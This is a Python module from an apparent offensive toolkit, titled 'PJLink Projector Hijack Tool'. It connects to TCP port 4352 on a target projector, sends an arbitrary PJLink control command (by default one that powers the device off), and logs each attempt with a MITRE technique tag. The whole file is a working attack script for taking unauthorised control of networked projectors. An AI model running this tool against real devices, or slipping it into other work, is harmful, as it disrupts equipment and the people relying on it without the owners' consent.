# modules/exploits/pjlink_projector_hijack.py

import socket
import argparse
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0830"

def log_projector(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_pjlink_command(target_ip, command):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, 4352))
        s.recv(1024)  # PJLINK handshake
        payload = f"%1{command}\r"
        s.send(payload.encode())
        resp = s.recv(1024).decode()
        print(f"[✓] Sent PJLink cmd: {command} → Response: {resp.strip()}")
        log_projector({
            "timestamp": datetime.utcnow().isoformat(),
            "target": target_ip,
            "command": command,
            "response": resp.strip(),
            "ttp": MITRE_TTP
        })
    except Exception as e:
        print(f"[!] PJLink error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PJLink Projector Hijack Tool")
    parser.add_argument("--target", required=True, help="Target IP of PJLink-compatible projector")
    parser.add_argument("--cmd", default="POWR 0", help="PJLink command (e.g., POWR 0 to turn off)")
    args = parser.parse_args()

    send_pjlink_command(args.target, args.cmd)
